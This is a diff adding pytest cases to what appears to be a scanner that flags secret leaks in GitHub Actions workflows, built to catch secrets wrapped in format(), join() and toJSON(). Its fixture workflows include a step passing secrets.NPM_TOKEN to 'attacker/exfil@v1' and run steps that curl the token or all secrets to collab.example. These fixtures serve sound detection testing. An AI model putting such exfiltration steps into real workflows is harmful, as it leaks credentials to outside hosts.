@@ -251,3 +251,113 @@ jobs:
     hits = scan_target(tmp_path, [], [])
     untrusted = [h for h in hits if h.sink_kind == "untrusted_action"]
     assert untrusted and untrusted[0].severity == "high"
+
+
+# ---------------------------------------------------------------------------
+# Expression-function wraps — format()/join() are first-class GHA
+# expression syntax; anchoring ``secrets.`` to the ``${{`` opener
+# missed every wrapped reference at BOTH high-severity sinks.
+# ---------------------------------------------------------------------------
+
+_FMT_WITH_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ format('{0}', secrets.NPM_TOKEN) }}
+"""
+
+_JOIN_WITH_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ join(fromJSON(format('["{0}"]', secrets.NPM_TOKEN)), '') }}
+"""
+
+_FMT_RUN_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "t=${{ format('{0}', secrets.NPM_TOKEN) }}" https://collab.example
+"""
+
+_TOJSON_RUN_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "t=${{ format('{0}', toJSON(secrets)) }}" https://collab.example
+"""
+
+_FMT_BENIGN_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ format('{0}', github.run_id) }}
+      - run: echo "see docs about secrets.NPM_TOKEN spelling"
+"""
+
+
+def test_format_wrapped_secret_into_untrusted_action_fires(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "fmt-with.yml", _FMT_WITH_WF)
+    hits = scan_target(tmp_path)
+    # untrusted_action hits carry the tainted INPUT names.
+    assert any(
+        h.sink_kind == "untrusted_action" and "token" in h.secret_names
+        for h in hits
+    )
+
+
+def test_join_wrapped_secret_into_untrusted_action_fires(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "join-with.yml", _JOIN_WITH_WF)
+    hits = scan_target(tmp_path)
+    assert any(
+        h.sink_kind == "untrusted_action" and "token" in h.secret_names
+        for h in hits
+    )
+
+
+def test_format_wrapped_secret_in_run_block_fires(tmp_path: Path) -> None:
+    _write_wf(tmp_path, "fmt-run.yml", _FMT_RUN_WF)
+    hits = scan_target(tmp_path)
+    assert any(
+        h.sink_kind == "run_block" and "NPM_TOKEN" in h.secret_names
+        for h in hits
+    )
+
+
+def test_tojson_wrapped_in_run_block_fires(tmp_path: Path) -> None:
+    _write_wf(tmp_path, "tojson-run.yml", _TOJSON_RUN_WF)
+    hits = scan_target(tmp_path)
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_expression_scoped_grammar_has_no_plain_text_false_positive(
+    tmp_path: Path,
+) -> None:
+    """``secrets.`` spelled OUTSIDE an expression (prose, comments)
+    and expressions with no secret reference stay silent — the
+    unanchored grammar is scoped to ``${{ … }}`` interiors."""
+    _write_wf(tmp_path, "benign.yml", _FMT_BENIGN_WF)
+    hits = scan_target(tmp_path)
+    assert not any(
+        h.sink_kind in ("untrusted_action", "run_block") for h in hits
+    )
